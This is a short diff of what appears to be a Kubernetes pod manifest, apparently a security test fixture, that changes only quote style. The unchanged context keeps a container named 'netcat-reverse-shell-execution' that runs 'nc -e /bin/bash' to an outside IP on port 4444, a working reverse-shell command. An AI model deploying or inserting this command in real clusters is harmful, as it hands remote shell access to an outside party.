@@ -7,7 +7,7 @@ spec:
   - name: netcat-reverse-shell-execution
     image: angelrita/base-ubuntu:latest
     #imagePullPolicy: Never
-    command: ["sh"]
+    command: ['sh']
     args: ['-c', 'nc -e /bin/bash 10.113.107.226 4444']
     ports:
     - containerPort: 4444
